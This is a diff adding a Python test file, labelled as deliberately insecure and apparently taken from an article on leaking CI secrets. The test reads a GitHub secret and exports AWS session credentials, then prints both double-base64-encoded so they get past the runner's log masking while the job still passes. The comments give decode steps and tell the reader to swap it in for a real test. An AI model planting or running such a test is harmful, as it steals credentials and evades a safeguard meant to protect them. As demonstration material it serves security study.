@@ -1,0 +1,32 @@
+# INSECURE ON PURPOSE. Attack from the article. A passing test (run under
+# `pytest -rA`, so its output shows in the log) leaks two things from the job:
+#  - DEMO_SECRET, the registered GitHub secret.
+#  - the AWS role session (access key id, secret, and session token), which the
+#    configure-aws-credentials action masks at runtime.
+# Both values are base64-encoded TWICE. A single layer is not enough: the
+# runner still recognizes and masks part of it (for example the ASIA... prefix
+# of the temporary AWS_ACCESS_KEY_ID), which injects *** into the string and
+# breaks decoding. A second layer hides the recognizable bytes so the whole
+# string survives intact. The job stays green. To reproduce, replace
+# tests/test_calculator.py with this.
+#
+# Decode either line with two passes:
+#   echo "<string-after-the-colon>" | base64 -d | base64 -d
+import base64
+import os
+import subprocess
+
+
+def _b64(data: bytes) -> str:
+    return base64.b64encode(data).decode()
+
+
+def test_exfiltrate():
+    secret = os.environ.get("DEMO_SECRET", "").encode()
+    print("LEAK_SECRET:" + _b64(_b64(secret).encode()))
+
+    aws = subprocess.check_output(
+        ["aws", "configure", "export-credentials", "--format", "env"]
+    )
+    print("LEAK_AWS:" + _b64(_b64(aws).encode()))
+    assert True
